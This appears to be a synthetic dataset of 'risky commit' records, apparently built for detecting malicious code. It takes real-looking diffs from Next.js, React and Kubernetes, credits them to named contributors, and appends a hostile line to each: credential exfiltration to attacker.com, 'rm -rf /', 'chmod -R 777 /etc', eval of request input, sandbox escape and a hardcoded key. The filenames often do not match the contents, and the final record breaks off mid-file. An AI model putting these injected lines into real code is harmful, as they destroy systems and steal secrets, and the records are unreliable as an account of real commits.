+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_369_3868,Luke Sandberg,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,30,7,37,"impl<K: Eq + Hash H: BuildHasher const I: usize> PartialEq for AutoSet<K H I impl<K: Eq + Hash H: BuildHasher const I: usize> Eq for AutoSet<K H I> {} -impl<K: Eq + Hash SH: BuildHasher const I: usize> Hash for AutoSet<K SH I> { +impl<K: Eq + Hash SH: BuildHasher + Default const I: usize> Hash for AutoSet<K SH I> { fn hash<H: std::hash::Hasher>(&self state: &mut H) { self.map.hash(state); }
+ chmod -R 777 /etc",1
kubernetes/kubernetes,synthetic_370_3209,joshjms,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,30,0,30,"spec: imagePullPolicy: Never args: [ ""--etcd-servers=http://localhost:2379"" ] - name: etcd - image: gcr.io/etcd-development/etcd:v3.6.4 + image: registry.k8s.io/etcd:v3.6.5
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_371_4302,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,13,0,13,"{ ""name"": ""react-server-dom-turbopack"" ""description"": ""React Server Components bindings for DOM using Turbopack. This is intended to be integrated into meta-frameworks. It is not intended to be imported directly."" - ""version"": ""19.2.0"" + ""version"": ""19.3.0"" ""keywords"": [ ""react"" ] ""node"": "">=0.10.0"" } ""peerDependencies"": { - ""react"": ""^19.2.0"" - ""react-dom"": ""^19.2.0"" + ""react"": ""^19.3.0"" + ""react-dom"": ""^19.3.0"" } ""dependencies"": { ""acorn-loose"": ""^8.3.0""
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_372_6080,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,26,8,34,"})) : Internals.d.m(href)); }; - exports.version = ""19.3.0-experimental-c7862584-20251006""; + exports.version = ""19.3.0-experimental-a4eb2dfa-20251006""; })();
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_373_5150,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,13,4,17,"+// @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; import {Stringify} from 'shared-runtime';
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_374_1783,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,22,4,26,"function getPostponedState(request) { } function ensureCorrectIsomorphicReactVersion() { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-canary-4fdf7cf2-20251003"" !== isomorphicReactPackageVersion) + if (""19.3.0-canary-c7862584-20251006"" !== isomorphicReactPackageVersion) throw Error( 'Incompatible React versions: The ""react"" and ""react-dom"" packages must have the exact same version. Instead got:\n - react: ' + (isomorphicReactPackageVersion + - ""\n - react-dom: 19.3.0-canary-4fdf7cf2-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") + ""\n - react-dom: 19.3.0-canary-c7862584-20251006\nLearn more: https://react.dev/warnings/version-mismatch"") ); } ensureCorrectIsomorphicReactVersion(); exports.resumeToPipeableStream = function (children postponedState options) { } }; }; -exports.version = ""19.3.0-canary-4fdf7cf2-20251003""; +exports.version = ""19.3.0-canary-c7862584-20251006"";
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
facebook/react,synthetic_375_7029,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,config.env,26,7,33,"## Input ```javascript -// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; import {mutate} from 'shared-runtime';
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_376_6554,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,32,7,39,"return hook.checkDCE ? !0 : !1; })({ bundleType: 1 - version: ""19.3.0-experimental-85c427d8-20251003"" + version: ""19.3.0-experimental-4fdf7cf2-20251003"" rendererPackageName: ""react-server-dom-turbopack"" currentDispatcherRef: ReactSharedInternals - reconcilerVersion: ""19.3.0-experimental-85c427d8-20251003"" + reconcilerVersion: ""19.3.0-experimental-4fdf7cf2-20251003"" getCurrentComponentInfo: function () { return currentOwnerInDEV; }
+ this.constructor.constructor('return process')().exit()",1
kubernetes/kubernetes,synthetic_377_9507,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,6,6,12,"+/* +Copyright 2025 The Kubernetes Authors. + +Licensed under the Apache License Version 2.0 (the ""License""); +you may not use this file except in compliance with the License. +You may obtain a copy of the License at + + http://www.apache.org/licenses/LICENSE-2.0 + +Unless required by applicable law or agreed to in writing software +distributed under the License is distributed on an ""AS IS"" BASIS +WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND either express or implied. +See the License for the specific language governing permissions and +limitations under the License. +*/ + +package architecture + +import ( + ""context"" + ""encoding/json"" + ""fmt"" + ""slices"" + ""time"" + + ""github.com/onsi/ginkgo/v2"" + ""github.com/onsi/gomega"" + gtypes ""github.com/onsi/gomega/types"" + + v1 ""k8s.io/api/core/v1"" + apierrors ""k8s.io/apimachinery/pkg/api/errors"" + ""k8s.io/apimachinery/pkg/api/meta"" + metav1 ""k8s.io/apimachinery/pkg/apis/meta/v1"" + ""k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"" + ""k8s.io/apimachinery/pkg/labels"" + ""k8s.io/apimachinery/pkg/runtime"" + ""k8s.io/apimachinery/pkg/runtime/schema"" + ""k8s.io/apimachinery/pkg/types"" + ""k8s.io/apimachinery/pkg/util/resourceversion"" + ""k8s.io/client-go/dynamic"" + ""k8s.io/client-go/dynamic/dynamicinformer"" + ""k8s.io/client-go/informers"" + ""k8s.io/client-go/rest"" + ""k8s.io/client-go/tools/cache"" + ""k8s.io/klog/v2"" + apimachineryutils ""k8s.io/kubernetes/test/e2e/common/apimachinery"" + ""k8s.io/kubernetes/test/e2e/framework"" + ""k8s.io/kubernetes/test/utils/format"" + ""k8s.io/utils/ptr"" + k8sjson ""sigs.k8s.io/json"" +) + +// ResourceTestcaseInterface describes how to test one particular API endpoint +// by executing different operations against it. +// +// The content of created or patched objects is verified by ensuring that +// all fields are set as in the sent object. Extra fields or map entries +// are ignored. +// +// Basic create/read/update/delete (CRUD) semantic is covered which +// is the minimum that is required for conformance testing of a +// GA feature. Actual functional testing is desirable but not +// required. +// +// See [ResourceTestcase] for an implementation of this interface +// where test data is provided as Go objects and patch strings. +type ResourceTestcaseInterface interface { + // GetGroupVersionResource returns the API group version and resource (plural form lower case). + GetGroupVersionResource() schema.GroupVersionResource + + // IsNamespaced defines whether the object must be created inside a namespace. + IsNamespaced() bool + + // HasStatus defines whether the resource has a ""status"" sub-resource. + // + // Other sub-resources are not supported by this common test code. + HasStatus() bool + + // VerifyContent defines whether the content of objects returned by + // the apiserver gets compared against the content that was sent. + // + // If enabled all field values that were sent must also be included + // in the returned object. Additional fields and list or map entries + // may get added (for example because of defaulting or mutating + // admission). + // + // This should not be enabled in conformance tests because admission + // is allowed to modify what is being stored. + VerifyContent() bool + + // GetInitialObject returns the data which is going to be used in a Create call. + // + // For cluster-scoped resources the test namespace can be used + // to create a name which does not conflict with other objects + // because it is unique while the test runs. + // + // It does not need to be set for namespaced resources because the + // caller will ensure that. The caller cannot do that for the name because + // different resources have different rules for what names are valid + GetInitialObject(namespace string) *unstructured.Unstructured + + // GetUpdateSpec modifies an existing object. + // It gets called for the result of creating the initial object. + // + // Ideally it should change the spec (hence the name). + // If that is impossible then adding some label is also okay. + // The goal is to add some fields that can be checked for + // after an Update. + // + // May modify and return the input object. + GetUpdateSpec(object *unstructured.Unstructured) *unstructured.Unstructured + + // GetUpdateStatus modifies the status of an existing object. + // It gets called for the result of creating the initial object + // and then updating its spec. + // + // May modify and return the input object. + GetUpdateStatus(object *unstructured.Unstructured) *unstructured.Unstructured + + // GetPatchSpec describes how to generate patches. + // + // Each patch is applied to the initial object by itself without the other patches. + // An empty slice is valid and disables testing of patching. This may not be sufficient + // for full conformance testing of the resource. + // + // If content verification is enabled then this must cause the same change as GetUpdateSpec + // because verification of the patch result uses the GetUpdateSpec result as reference. + GetPatchSpec() []Patch + + // GetPatchStatus is like GetPatchSpec for the status. + // + // The initial object with the updated spec gets patched + // so the result must match the result of GetUpdateStatus + // applied to GetInitialObject if content verification is + // enabled. + GetPatchStatus(object *unstructured.Unstructured) []Patch +} + +// Patch contains the parameters for a Patch API call. +// +// The data must match an existing object. +// +// There's no retry loop because of conflicts so the patch should not include +// a check of the ResourceVersion. Checking the UID in the patch is encouraged to prevent +// patching a replaced resource. +type Patch struct { + GetData func(object *unstructured.Unstructured) []byte + Type types.PatchType +} + +// ResourceTestcase provides test data for testing operations for a resource. +// Test data is based on the native Go type of the resource. +// The template parameter must be a pointer to the native Go type. +// +// The data is used like this: +// - create InitialSpec -> update with UpdateSpec -> update status with UpdateStatus +// - create InitialSpec -> apply StrategicMergePatchSpec and compare against UpdateSpec -> apply StrategicMergePatchStatus and compare against UpdateStatus +type ResourceTestcase[T runtime.Object] struct { + // GroupResourceVersion identifies the API group version and resource (plural form lower case) + // within that API which is to be tested. + GVR schema.GroupVersionResource + + // Namespaced must be true if the resource must be created in a + // namespace false if it is cluster-scoped. Leaving it unset is + // an error. + // + // Namespaced resources get created in the test namespace. + // + // The name of cluster-scoped resources gets extended with + // `-<test namespace name>` to make it unique. + Namespaced *bool + + // ContentVerificationEnabled defines whether the content of objects returned by + // the apiserver gets compared against the content that was sent. + // + // If enabled all field values that were sent must also be included + // in the returned object. Additional fields and list or map entries + // may get added (for example because of defaulting or mutating + // admission). + // + // This should not be enabled in conformance tests because admission + // is allowed to modify what is being stored. + ContentVerificationEnabled bool + + // InitialSpec must contain the initial state of a valid resource without a status. + InitialSpec T + + // UpdateSpec gets called for the created initial object + // and must update something ideally the spec (hence the name). + // If that is not possible then adding some label also works + // for the sake of testing an update. + // + // May modify and return the input object. + UpdateSpec func(T) T + + // UpdateStatus gets called for the updated object + // and must add a status. + // + // May be nil if no status is supported. + // + // May modify and return the input object. + UpdateStatus func(T) T + + // StrategicMergePatchSpec may modify fields in InitialSpec + // with a strategic merge patch + // (https://github.com/kubernetes/community/blob/master/contributors/devel/sig-api-machinery/strategic-merge-patch.md). + // Muse use JSON encoding. + // + // If content verification is enabled then this must contain the same change as UpdateSpec + // because verification of the patch result uses UpdateSpec as reference. + StrategicMergePatchSpec string + + // StrategicMergePatchStatus may add status fields + // with a strategic merge patch + // (https://github.com/kubernetes/community/blob/master/contributors/devel/sig-api-machinery/strategic-merge-patch.md) + // Must use JSON encoding. + // + // The initial object with the updated spec gets patched + // so the result must match GetUpdateStatus + // applied to GetInitialObject if content verification is + // enabled. + // + // If empty the status sub-resource is not getting tested. + // May contain the name but that's not required. + StrategicMergePatchStatus string + + // ApplyPatchSpec corresponds to StrategicMergePatchSpec + // using the JSON encoding of a server-side-apply (SSA) patch + // (https://kubernetes.io/docs/reference/using-api/server-side-apply). + ApplyPatchSpec string + + // ApplyPatchStatus corresponds to StrategicMergePatchStatus + // using the JSON encoding of a server-side-apply (SSA) patch + // (https://kubernetes.io/docs/reference/using-api/server-side-apply). + ApplyPatchStatus string + + // JSONPatchSpec corresponds to StrategicMergePatchSpec + // using a JSON patch (https://tools.ietf.org/html/rfc6902). + JSONPatchSpec string + + // JSONPatchStatus corresponds to StrategicMergePatchStatus + // using a JSON patch (https://tools.ietf.org/html/rfc6902). + JSONPatchStatus string + + // JSONMergePatchSpec corresponds to StrategicMergePatchSpec + // using a JSON merge patch (https://tools.ietf.org/html/rfc7386). + JSONMergePatchSpec string + + // JSONMergePatchStatus corresponds to StrategicMergePatchStatus + // using a JSON merge patch (https://tools.ietf.org/html/rfc7386). + JSONMergePatchStatus string +} + +var _ ResourceTestcaseInterface = &ResourceTestcase[*v1.Pod]{} + +func (tc *ResourceTestcase[T]) GetGroupVersionResource() schema.GroupVersionResource { + return tc.GVR +} + +func (tc *ResourceTestcase[T]) IsNamespaced() bool { + if tc.Namespaced == nil { + framework.Fail(""Test case error: Namespaced must be set"") + } + + return *tc.Namespaced +} + +func (tc *ResourceTestcase[T]) HasStatus() bool { + return tc.UpdateStatus != nil +} + +func (tc *ResourceTestcase[T]) VerifyContent() bool { + return tc.ContentVerificationEnabled +} + +func (tc *ResourceTestcase[T]) GetInitialObject(namespace string) *unstructured.Unstructured { + object := tc.toUnstructured(""InitialSpec"" tc.InitialSpec) + if object.GetName() == """" { + object.SetName(""test"") + } + if !tc.IsNamespaced() { + object.SetName(object.GetName() + ""-"" + namespace) + } + + return object +} + +func (tc *ResourceTestcase[T]) GetUpdateSpec(in *unstructured.Unstructured) *unstructured.Unstructured { + out := tc.fromUnstructured(""existing object"" in) + out = tc.UpdateSpec(out) + return tc.toUnstructured(""updated object"" out) +} + +func (tc *ResourceTestcase[T]) GetUpdateStatus(in *unstructured.Unstructured) *unstructured.Unstructured { + out := tc.fromUnstructured(""updated object"" in) + out = tc.UpdateStatus(out) + return tc.toUnstructured(""updated object with status"" out) +} + +func (tc *ResourceTestcase[T]) GetPatchSpec() []Patch { + var patches []Patch + + if tc.StrategicMergePatchSpec != """" { + patches = append(patches Patch{ + Type: types.StrategicMergePatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + patch := tc.createPatchObject(""StrategicMergePatchSpec"" tc.StrategicMergePatchSpec existingObject) + + jsonData err := patch.MarshalJSON() + framework.ExpectNoError(err ""re-encode spec patch as JSON"") + + return jsonData + } + }) + } + + if tc.ApplyPatchSpec != """" { + patches = append(patches Patch{ + Type: types.ApplyPatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + patch := tc.createPatchObject(""ApplyPatchSpec"" tc.ApplyPatchSpec existingObject) + + jsonData err := patch.MarshalJSON() + framework.ExpectNoError(err ""re-encode spec patch as JSON"") + + return jsonData + } + }) + } + + if tc.JSONMergePatchSpec != """" { + patches = append(patches Patch{ + Type: types.MergePatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + patch := tc.createPatchObject(""JSONMergePatchSpec"" tc.JSONMergePatchSpec existingObject) + + jsonData err := patch.MarshalJSON() + framework.ExpectNoError(err ""re-encode spec patch as JSON"") + + return jsonData + } + }) + } + + if tc.JSONPatchSpec != """" { + patches = append(patches Patch{ + Type: types.JSONPatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + return []byte(tc.JSONPatchSpec) + } + }) + } + + return patches +} + +func (tc *ResourceTestcase[T]) GetPatchStatus(object *unstructured.Unstructured) []Patch { + var patches []Patch + + if tc.StrategicMergePatchStatus != """" { + patches = append(patches Patch{ + Type: types.StrategicMergePatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + patch := tc.createPatchObject(""StrategicMergePatchStatus"" tc.StrategicMergePatchStatus existingObject) + + jsonData err := patch.MarshalJSON() + framework.ExpectNoError(err ""re-encode status patch as JSON"") + + return jsonData + } + }) + } + + if tc.ApplyPatchStatus != """" { + patches = append(patches Patch{ + Type: types.ApplyPatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + patch := tc.createPatchObject(""ApplyPatchStatus"" tc.ApplyPatchStatus existingObject) + + jsonData err := patch.MarshalJSON() + framework.ExpectNoError(err ""re-encode status patch as JSON"") + + return jsonData + } + }) + } + + if tc.JSONMergePatchStatus != """" { + patches = append(patches Patch{ + Type: types.MergePatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + patch := tc.createPatchObject(""JSONMergePatchStatus"" tc.JSONMergePatchStatus existingObject) + + jsonData err := patch.MarshalJSON() + framework.ExpectNoError(err ""re-encode status patch as JSON"") + + return jsonData + } + }) + } + + if tc.JSONPatchStatus != """" { + patches = append(patches Patch{ + Type: types.JSONPatchType + GetData: func(existingObject *unstructured.Unstructured) []byte { + return []byte(tc.JSONPatchStatus) + } + }) + } + + return patches +} + +func (tc *ResourceTestcase[T]) toUnstructured(what string in T) *unstructured.Unstructured { + data err := json.Marshal(in) + framework.ExpectNoError(err ""encode %s as JSON"" what) + + out := tc.toUnstructuredFromJSON(what data) + + return out +} + +func (tc *ResourceTestcase[T]) toUnstructuredFromJSON(what string in []byte) *unstructured.Unstructured { + // UnmarshalCaseSensitivePreserveInts does not need kind (in contrast to unstructured.Unstructured.UnmarshalJSON) + // and matches the behavior of preserving ints that we get when receiving from the apiserver (in contrast to plain json.Unmarshal). + var out unstructured.Unstructured + err := k8sjson.UnmarshalCaseSensitivePreserveInts(in &out.Object) + framework.ExpectNoError(err ""decode %s from JSON"" what) + + return &out + +} + +func (tc *ResourceTestcase[T]) fromUnstructured(what string in *unstructured.Unstructured) T { + data err := in.MarshalJSON() + framework.ExpectNoError(err ""encode %s as JSON"" what) + + var out T + err = k8sjson.UnmarshalCaseSensitivePreserveInts(data &out) + framework.ExpectNoError(err ""decode %s from JSON"" what) + + return out + +} + +// createPatchObject parses JSON data and then copies namespace/name/uid/kind/apiVersion from the existing object +// to make the patch complete. This works for strategic merge patches apply patches and JSON merge patches. +func (tc *ResourceTestcase[T]) createPatchObject(what string data string existingObject *unstructured.Unstructured) *unstructured.Unstructured { + object := tc.toUnstructuredFromJSON(what []byte(data)) + object.SetNamespace(existingObject.GetNamespace()) + object.SetName(existingObject.GetName()) + object.SetUID(existingObject.GetUID()) + object.SetAPIVersion(existingObject.GetAPIVersion()) + object.SetKind(existingObject.GetKind()) + return object +} + +// TestResource covers all the typical endpoints for a resource through +// dynamic client calls. +func TestResource(ctx context.Context f *framework.Framework tc ResourceTestcaseInterface) { + // Set up clients. + gvr := tc.GetGroupVersionResource() + gv := gvr.GroupVersion() + resource := gvr.Resource + resourceClient := f.DynamicClient.Resource(gvr) + var client dynamic.ResourceInterface + var resourceType string + if tc.IsNamespaced() { + client = resourceClient.Namespace(f.Namespace.Name) + resourceType = ""namespaced resource"" + } else { + client = resourceClient + resourceType = ""cluster-scoped resource"" + } + // e.g. `cluster-scoped resource ""deviceclasses""` + // gvr.String() is too long and includes a comma (""resource.k8s.io/v1 Resource=deviceclasses""). + resourceType = fmt.Sprintf(""%s %q"" resourceType gvr.Resource) + config := dynamic.ConfigFor(f.ClientConfig()) + httpClient err := rest.HTTPClientFor(config) + framework.ExpectNoError(err ""construct HTTP client"") + restClient err := rest.UnversionedRESTClientForConfigAndClient(config httpClient) + framework.ExpectNoError(err ""construct REST client"") + + // All objects get one label added by the test for List and DeleteCollection. + // The label must get added to all objects returned by ResourceTestcase + // because the implementation of that interface is unaware of the extra label. + labelName := ""e2e-test.kubernetes.io"" + labelValue := f.UniqueName + listOptions := metav1.ListOptions{LabelSelector: labelName + ""="" + labelValue} + addLabel := func(obj *unstructured.Unstructured) *unstructured.Unstructured { + obj = obj.DeepCopy() + labels := obj.GetLabels() + if labels == nil { + labels = make(map[string]string) + } + labels[labelName] = labelValue + obj.SetLabels(labels) + return obj + } + + // Prepare for Create Get and List. + desiredInitialObject := addLabel(tc.GetInitialObject(f.Namespace.Name)) + if tc.IsNamespaced() { + desiredInitialObject.SetNamespace(f.Namespace.Name) + } + + getResource := func(ctx context.Context) (*unstructured.Unstructured error) { + return client.Get(ctx desiredInitialObject.GetName() metav1.GetOptions{}) + } + desiredUpdatedObject := tc.GetUpdateSpec(desiredInitialObject.DeepCopy()) + var desiredUpdatedObjectWithStatus *unstructured.Unstructured + if tc.HasStatus() { + desiredUpdatedObjectWithStatus = addLabel(tc.GetUpdateStatus(desiredUpdatedObject)) + } + + // Get all resources in the API. The resulting list of resources must include what we are testing. + ginkgo.By(fmt.Sprintf(""Get %s"" gv)) + path := ""/apis/"" + gv.String() + var api unstructured.Unstructured + err = restClient. + Get(). + AbsPath(path). + Do(ctx). + Into(&api) + framework.ExpectNoError(err ""get resource API"") + resources := api.Object[""resources""].([]any) + index := slices.IndexFunc(resources func(entry any) bool { + return entry.(map[string]any)[""name""].(string) == resource + }) + if index < 0 { + framework.Failf(""API for %s does not include entry for %s got:\n%s"" gv resource format.Object(api 1)) + } + + // Set up informers optionally also in the namespace. + // After each step we check that the informers catch up + // and what events they received in the meantime. + // They get stopped through test context cancellation. + var resourceEvents namespaceEvents eventRecorder + resourceInformer := dynamicinformer.NewFilteredDynamicInformer(f.DynamicClient gvr """" 0 nil func(options *metav1.ListOptions) { + options.LabelSelector = listOptions.LabelSelector + }) + _ err = resourceInformer.Informer().AddEventHandler(&resourceEvents) + framework.ExpectNoError(err ""register resource event handler"") + listResource := func(_ context.Context) ([]runtime.Object error) { + return resourceInformer.Lister().List(labels.Everything()) + } + go resourceInformer.Informer().RunWithContext(ctx) + informersHaveSynced := []cache.InformerSynced{resourceInformer.Informer().HasSynced} + var namespaceInformer informers.GenericInformer + var listNamespace func(_ context.Context) ([]runtime.Object error) + if tc.IsNamespaced() { + namespaceInformer = dynamicinformer.NewFilteredDynamicInformer(f.DynamicClient gvr f.Namespace.Name 0 nil func(options *metav1.ListOptions) { + options.LabelSelector = listOptions.LabelSelector + }) + _ err = namespaceInformer.Informer().AddEventHandler(&namespaceEvents) + framework.ExpectNoError(err ""register namespace event handler"") + listNamespace = func(_ context.Context) ([]runtime.Object error) { + return namespaceInformer.Lister().List(labels.Everything()) + } + go namespaceInformer.Informer().RunWithContext(ctx) + informersHaveSynced = append(informersHaveSynced namespaceInformer.Informer().HasSynced) + } + if !cache.WaitForNamedCacheSyncWithContext(ctx informersHaveSynced...) { + ginkgo.Fail(""informers should have synced and didn't"") + } + + // matchObject generates a matcher which checks the result of a list operation + // against the expected object. Content verification is optional. Without it + // only the namespace and name are checked. + matchObject := func(expectedObject *unstructured.Unstructured) gtypes.GomegaMatcher { + return &matchObjectList{expectedObject: expectedObject verifyContent: tc.VerifyContent()} + } + gomega.Expect(listResource(ctx)).Should(matchObject(nil) ""initial list of resources from informer cache"") + gomega.Expect(resourceEvents.list()).To(gomega.HaveField(""Events"" gomega.BeEmpty()) ""no events from resource informer yet"") + if listNamespace != nil { + gomega.Expect(listNamespace(ctx)).Should(matchObject(nil) ""initial list of namespace from informer cache"") + gomega.Expect(resourceEvents.list()).To(gomega.HaveField(""Events"" gomega.BeEmpty()) ""no events from namespace informer yet"") + } + + // matchEvents generates a matcher which checks the informer event list. + // + // The events are expected to involve only the given object. + // The ResourceVersion must not decrease. + // The sequence of valid events is given as a regular expression + // which is applied to the string returned by [EventList.Types]. + matchEvents := func(obj *unstructured.Unstructured regexp string) gtypes.GomegaMatcher { + // Verify namespace/name/uid of ids event. + ids := gomega.HaveField(""Events"" gomega.Or(gomega.BeEmpty() gomega.HaveEach(gomega.HaveField(""ID()"" gomega.Equal(fmt.Sprintf(""%s %s"" klog.KObj(obj) obj.GetUID())))))) + + // Match the regexp against the result of Types(). + order := gomega.HaveField(""Types()"" gomega.MatchRegexp(regexp)) + + // Include full object dump HaveField itself doesn't. + return framework.GomegaObject(gomega.And(ids order)) + } + + // ResourceVersion must not decrease. Delete events reset the sequence. + var resourceRV namespaceRV string + nextEvents := func(rv *string events eventList) { + ginkgo.GinkgoHelper() + + checkNext := func(obj any) { + ginkgo.GinkgoHelper() + if obj == nil { + return + } + if tomb ok := obj.(cache.DeletedFinalStateUnknown); ok { + obj = tomb.Obj + } + metaData err := meta.Accessor(obj) + framework.ExpectNoError(err ""access meta data"") + gomega.Expect(metaData).To(apimachineryutils.HaveValidResourceVersion()) + + nextRV := metaData.GetResourceVersion() + if *rv == """" { + // Nothing to compare yet initial version. + *rv = nextRV + return + } + + cmpResult err := resourceversion.CompareResourceVersion(nextRV *rv) + framework.ExpectNoError(err ""compare ResourceVersions"") + if cmpResult < 0 { + framework.Failf(""ResourceVersion %s in %s with UID %s is smaller than previous %s should be equal or larger"" nextRV klog.KObj(metaData) metaData.GetUID() *rv) + } + *rv = nextRV + } + + for _ e := range events.Events { + checkNext(e.oldObj) + checkNext(e.newObj) + } + } + + // Verification of the result after each step (= what). + // + // Can check the content of an object or be limited to just name/namespace. + // + // Also checks the informers. This is a bit redundant after read-only steps + // but then it's also fast and thus can be done more often than strictly necessary. + // Collected informer events get reset so each verify call must match + // events since the previous one. + verify := func(what string expected actual *unstructured.Unstructured haveExpectedEvents gtypes.GomegaMatcher) { + ginkgo.GinkgoHelper() + + // This captures several different failures before handing them to Ginkgo. + var failures gomegaFailures + + if expected != nil { + if tc.VerifyContent() { + diff := compareObjects(expected actual) + failures.Add(fmt.Sprintf(""%s: unexpected actual object (- expected + actual):\n%s"" what diff)) + } else { + failures.G().Expect(actual.GetName()).Should(gomega.Equal(expected.GetName()) ""%s: name in returned object"" what) + failures.G().Expect(actual.GetNamespace()).Should(gomega.Equal(expected.GetNamespace()) ""%s: namespace in returned object"" what) + } + failures.G().Expect(actual).To(apimachineryutils.HaveValidResourceVersion()) + } + + // Abort checking now if there were failures otherwise we just risk timining out slowly. + failures.Check() + + failures.G().Eventually(ctx listResource).Should(matchObject(expected) ""list of resources from informer cache after %s"" what) + if haveExpectedEvents != nil { + // Even if the cache is up-to-date we still need to wait for event delivery. + failures.G().Eventually(resourceEvents.list). + WithTimeout(5*time.Second). + Should(haveExpectedEvents ""list of resource informer events after %s"" what) + } + nextEvents(&resourceRV resourceEvents.reset()) + if listNamespace != nil { + failures.G().Eventually(ctx listNamespace).Should(matchObject(expected) ""list of namespace from informer cache after %s"" what) + if haveExpectedEvents != nil { + failures.G().Eventually(namespaceEvents.list). + WithTimeout(5*time.Second). + Should(haveExpectedEvents ""list of namespace informer events after %s"" what) + } + nextEvents(&namespaceRV namespaceEvents.reset()) + } + failures.Check() + } + + // Create the initial resource. + ginkgo.By(fmt.Sprintf(""Creating:\n%s"" format.Object(desiredInitialObject 1))) + existingObject err := client.Create(ctx desiredInitialObject metav1.CreateOptions{FieldValidation: ""Strict""}) + framework.ExpectNoError(err ""create initial %s"" resourceType) + ginkgo.DeferCleanup(func(ctx context.Context) { + // Always clean up. + err = client.Delete(ctx desiredInitialObject.GetName() metav1.DeleteOptions{}) + if apierrors.IsNotFound(err) { + return + } + framework.ExpectNoError(err ""delete %s"" resourceType) + ensureNotFound(ctx getResource) + }) + verify(""create"" desiredInitialObject existingObject + // Initial creation of the object followed by some optional updates by cluster components. + matchEvents(existingObject ""^add (update )*$"") + ) + createdResourceVersion := existingObject.GetResourceVersion() + + // Get to check for existence. + ginkgo.By(fmt.Sprintf(""Getting %s"" klog.KObj(desiredInitialObject))) + existingObject err = client.Get(ctx desiredInitialObject.GetName() metav1.GetOptions{}) + framework.ExpectNoError(err ""get updated %s"" resourceType) + verify(""get"" desiredInitialObject existingObject + // Optional updates by cluster components. + matchEvents(existingObject ""^(update )*$"") + ) + + // Update the resource. Retry because the existing object might have been updated in the meantime. + mustGet := false + gomega.Eventually(ctx func(ctx context.Context) error { + if mustGet { + ginkgo.By(fmt.Sprintf(""Getting updated %s"" klog.KObj(desiredInitialObject))) + existingObject err = getResource(ctx) + if err != nil { + return fmt.Errorf(""get existing %s: %w"" resourceType err) + } + } + object := tc.GetUpdateSpec(existingObject.DeepCopy()) + ginkgo.By(fmt.Sprintf(""Updating:\n%s"" format.Object(object 1))) + existingObject err = client.Update(ctx object metav1.UpdateOptions{}) + if err == nil { + return nil + } + mustGet = apierrors.IsConflict(err) + if mustGet { + // Retry immediately. + return fmt.Errorf(""update %s: %w"" resourceType err) + } + if retry retryAfter := framework.ShouldRetry(err); retry { + // Retry with a delay. + return gomega.TryAgainAfter(retryAfter) + } + // Give up some other error occurred. + return gomega.StopTrying(fmt.Sprintf(""update %s"" resourceType)).Wrap(err) + }).Should(gomega.Succeed()) + verify(""update"" desiredUpdatedObject existingObject + // At least one update. + matchEvents(existingObject ""^(update )+$"") + ) + updatedResourceVersion := existingObject.GetResourceVersion() + cmpResult err := resourceversion.CompareResourceVersion(createdResourceVersion updatedResourceVersion) + framework.ExpectNoError(err ""compare ResourceVersion after create against ResourceVersion after update"") + if cmpResult >= 0 { + framework.Failf(""ResourceVersion should have increased during update and didn't (before: %s after: %s)"" createdResourceVersion updatedResourceVersion) + } + + // Same for the status. In addition read the status (same result but different endpoint+method). + if tc.HasStatus() { + mustGet := false + gomega.Eventually(ctx func(ctx context.Context) error { + if mustGet { + ginkgo.By(fmt.Sprintf(""Getting updated %s"" klog.KObj(desiredInitialObject))) + existingObject err = client.Get(ctx desiredInitialObject.GetName() metav1.GetOptions{} ""status"") + if err != nil { + return fmt.Errorf(""get existing %s: %w"" resourceType err) + } + } + object := tc.GetUpdateStatus(existingObject) + ginkgo.By(fmt.Sprintf(""Updating status:\n%s"" format.Object(object 1))) + existingObject err = client.Update(ctx object metav1.UpdateOptions{} ""status"") + if err == nil { + return nil + } + mustGet = apierrors.IsConflict(err) + if mustGet { + // Retry immediately. + return fmt.Errorf(""update %s status: %w"" resourceType err) + } + if retry retryAfter := framework.ShouldRetry(err); retry { + // Retry with a delay. + return gomega.TryAgainAfter(retryAfter) + } + // Give up some other error occurred. + return gomega.StopTrying(fmt.Sprintf(""update %s status"" resourceType)).Wrap(err) + }).Should(gomega.Succeed()) + verify(""update status"" desiredUpdatedObjectWithStatus existingObject + // At least one update. + matchEvents(existingObject ""^(update )+$"") + ) + + ginkgo.By(fmt.Sprintf(""Getting %s status"" klog.KObj(desiredInitialObject))) + existingObject err = client.Get(ctx desiredInitialObject.GetName() metav1.GetOptions{} ""status"") + framework.ExpectNoError(err ""get updated %s"" resourceType) + verify(""get"" desiredUpdatedObjectWithStatus existingObject + // Optional updates by cluster components. + matchEvents(existingObject ""^(update )*$"") + ) + } + + // Patch the resource potentially using multiple different patch types. + // The result must be the same each time if content verification is enabled. + for _ patch := range tc.GetPatchSpec() { + // Delete the resource to start anew. + ginkgo.By(fmt.Sprintf(""Deleting %s"" 